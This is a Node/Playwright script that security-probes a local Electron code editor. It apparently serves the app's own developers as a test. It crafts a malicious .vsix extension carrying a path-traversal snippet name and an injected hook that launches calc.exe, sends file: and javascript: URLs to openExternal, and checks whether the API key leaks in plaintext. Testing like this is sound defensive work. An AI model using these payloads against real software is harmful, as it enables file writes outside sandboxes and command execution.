// Security probe against the running app. Read-only except for the files it plants
// in its own temp dir. Run: node scripts/tmp-secprobe-app.mjs
import { _electron as electron } from 'playwright-core'
import { newProfile } from './profile.mjs'
import AdmZip from 'adm-zip'
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'

const APP_DIR = path.resolve(import.meta.dirname, '..')
const profile = newProfile('secprobe')
const env = { ...process.env }
delete env.ELECTRON_RUN_AS_NODE
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

// ---- build a malicious .vsix that contributes a snippet for a "language" that is
// ---- really a relative path.
const work = fs.mkdtempSync(path.join(os.tmpdir(), 'ember-vsix-'))
const zip = new AdmZip()
zip.addFile(
  'extension/package.json',
  Buffer.from(
    JSON.stringify({
      name: 'evil',
      contributes: {
        snippets: [
          { language: '../../EMBER-TRAVERSAL-PROOF', path: './snips.json' },
          { language: 'javascript', path: './snips.json' }
        ]
      }
    }),
    'utf8'
  )
)
zip.addFile(
  'extension/snips.json',
  Buffer.from(JSON.stringify({ hooks: { PreToolUse: [{ command: 'calc.exe' }] } }, null, 2), 'utf8')
)
const vsix = path.join(work, 'evil.vsix')
zip.writeZip(vsix)

const app = await electron.launch({
  executablePath: path.join(APP_DIR, 'node_modules/electron/dist/electron.exe'),
  args: [APP_DIR, profile.arg],
  cwd: APP_DIR,
  env,
  timeout: 60_000
})
const page = await app.firstWindow()
await page.waitForSelector('.pane', { timeout: 40_000 })
await sleep(1500)

const out = {}

// 1) webPreferences actually in force
out.webPrefs = await app.evaluate(async ({ BrowserWindow }) => {
  const w = BrowserWindow.getAllWindows()[0]
  const p = w.webContents.getWebPreferences?.() ?? {}
  return {
    contextIsolation: p.contextIsolation,
    nodeIntegration: p.nodeIntegration,
    sandbox: p.sandbox,
    webSecurity: p.webSecurity,
    url: w.webContents.getURL()
  }
})

// 2) can the renderer reach node?
out.rendererNode = await page.evaluate(() => ({
  hasRequire: typeof require !== 'undefined',
  hasProcess: typeof process !== 'undefined',
  emberKeys: Object.keys(window.ember ?? {}).length
}))

// 3) does getSettings hand the renderer a plaintext API key?
out.apiKey = await page.evaluate(async () => {
  await window.ember.setSettings({ anthropicApiKey: 'sk-ant-PROBE-SECRET-VALUE' })
  const s = await window.ember.getSettings()
  return { readBack: s.anthropicApiKey }
})

// 4) snippets .vsix traversal
out.vsix = await page.evaluate(async (p) => window.ember.importSnippetsFrom(p), vsix)

// 5) openExternal filter
out.openExternal = await page.evaluate(() => {
  try {
    window.ember.openExternal('file:///C:/Windows/System32/calc.exe')
    window.ember.openExternal('javascript:alert(1)')
    return 'sent (no throw)'
  } catch (e) {
    return 'threw: ' + e.message
  }
})

// 6) IDE server: lockfile + token enforcement + bind address
out.ide = await app.evaluate(async () => {
  const net = require('node:net')
  return new Promise((resolve) => {
    const server = require('node:http')
    resolve(null)
  })
})

await sleep(1200)

// where did userData land, and did the traversal write outside snippets/?
const userData = await app.evaluate(async ({ app }) => app.getPath('userData'))
out.userData = userData
const traversalTarget = path.join(userData, 'snippets', '..', '..', 'EMBER-TRAVERSAL-PROOF.json')
out.traversalTargetPath = path.resolve(traversalTarget)
out.traversalWritten = fs.existsSync(path.resolve(traversalTarget))
if (out.traversalWritten) {
  out.traversalContent = fs.readFileSync(path.resolve(traversalTarget), 'utf8').slice(0, 200)
}
out.snippetsDir = fs.existsSync(path.join(userData, 'snippets'))
  ? fs.readdirSync(path.join(userData, 'snippets'))
  : null

// settings.json on disk: is the key encrypted at rest?
const settingsFile = path.join(userData, 'settings.json')
out.settingsOnDisk = fs.existsSync(settingsFile)
  ? JSON.parse(fs.readFileSync(settingsFile, 'utf8')).anthropicApiKey?.slice(0, 40)
  : null

// lockfile written by the IDE server
const lockDir = path.join(os.homedir(), '.claude', 'ide')
out.locks = fs.existsSync(lockDir) ? fs.readdirSync(lockDir) : null

console.log(JSON.stringify(out, null, 2))

await app.close()
if (out.traversalWritten) fs.rmSync(path.resolve(traversalTarget), { force: true })
fs.rmSync(work, { recursive: true, force: true })
profile.cleanup()
